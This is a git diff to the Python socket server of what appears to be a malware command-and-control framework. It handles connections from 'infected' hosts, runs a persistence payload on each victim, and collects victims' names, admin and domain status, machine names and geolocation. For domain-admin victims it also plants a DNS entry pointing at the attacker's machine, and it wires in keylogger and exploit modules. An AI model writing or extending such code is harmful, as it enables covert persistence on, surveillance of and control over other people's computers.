@@ -6,14 +6,10 @@ from classes.agent import Agent
 from dataManager.dataManager import DataManager
 from dataManager.repository.userRepository import UserRepository
 import logging
-from modules.KeyloggerModule import KeyloggerModule
-from modules.Recognizer import Recognizer
-from modules.ExploitModule import ExploitModule
 from app_state import AppState
 
-
 class SocketServer:
-    def __init__(self, app_state: AppState, host="0.0.0.0", port=4242, certfile='certs/cert.pem', keyfile='certs/key.pem', lock: asyncio.Lock = None):
+    def __init__(self, app_state: AppState, host="0.0.0.0", port=4242, local_addr=None, certfile='certs/cert.pem', keyfile='certs/key.pem', lock: asyncio.Lock = None):
         self.host = host
         self.port = port
         self.data_manager: DataManager = app_state.data_manager
@@ -25,6 +21,7 @@ class SocketServer:
         self.keylogger = self.data_manager.keylogger_module
         self.exploit_module = self.data_manager.exploit_module
         self.agent_module = self.data_manager.agent_module
+        self.local_addr = local_addr
 
     async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         ip, port = writer.get_extra_info('peername')
@@ -51,47 +48,49 @@ class SocketServer:
         Monitors the socket for closure and logs out the user when closed.
         """
         while True:
-            await asyncio.sleep(5)  # Check every 5 seconds
+            await asyncio.sleep(5)
             if user.reader.at_eof() or user.writer.is_closing():
                 logging.info(f"Connection closed for user {user.uuid}")
                 user.connection_time.append({
                     "event": "logout",
                     "timestamp": datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
                 })
-                # Save updated user data
                 self.user_repository.save_user(user)
                 break
 
     async def route(self, service, uuid, params, reader, writer, ip, port):
         if service == "infected":
             logging.info(f"New infection vector: {uuid}")
-            if uuid in [x["logged"] for x in self.user_repository.get_user_list()]:
-                writer.write("exit".encode())
-                return "[close]"
+            async with self.lock:
+                user = self.user_repository.get_user(uuid)
+                if not user:
+                    user = User(uuid, ip, port, reader, writer, agent_module=self.agent_module)
+                    self.user_repository.add_user(user)
+                if user and not user.route_lock:
+                    user.route_lock = asyncio.Lock()
 
-            user = self.user_repository.get_user(uuid)
-            if not user:
-                user = User(uuid, ip, port, reader, writer, agent_module=self.agent_module)
-                self.user_repository.add_user(user)
-            else:
+            async with user.route_lock:
+                if user.is_logged_in():
+                    user.standby_sessions.append(user.copy())
+                    
                 user.ip = ip
                 user.port = port
                 user.reader = reader
                 user.writer = writer
                 user.agent_module = self.agent_module
 
-            await user.execute("./modules/payloads/payload_persistence.py")
-            user.connection_time.append({
-                "event": "login",
-                "timestamp": datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
-            })
-            user.first_name, user.last_name, user.username, user.is_admin, user.is_domain_admin, user.domain_name, user.machine_name = (await self.recognizer.get_user_infos(reader, writer)).values()
-            user.longitude, user.latitude, user.city, user.region, user.country = (await self.recognizer.get_user_position(reader, writer)).values()
-            user.start_not_running_watchers()
-
-            # Save user data and start monitoring socket state
-            self.user_repository.save_user(user)
-            asyncio.create_task(self.monitor_socket(user))
+                await user.execute("./modules/payloads/payload_persistence.py")
+                user.connection_time.append({
+                    "event": "login",
+                    "timestamp": datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
+                })
+                user.first_name, user.last_name, user.username, user.is_admin, user.is_domain_admin, user.domain_name, user.machine_name = (await self.recognizer.get_user_infos(reader, writer)).values()
+                user.longitude, user.latitude, user.city, user.region, user.country = (await self.recognizer.get_user_position(reader, writer)).values()
+                user.start_not_running_watchers()
+                if user.is_domain_admin:
+                    await self.data_manager.dns_module.add_entry(user.uuid, 'hackstation', self.local_addr, 'virology.fr')
+                self.user_repository.save_user(user)
+                asyncio.create_task(self.monitor_socket(user))
 
         elif service == "agent":
             user = self.user_repository.get_user(uuid)
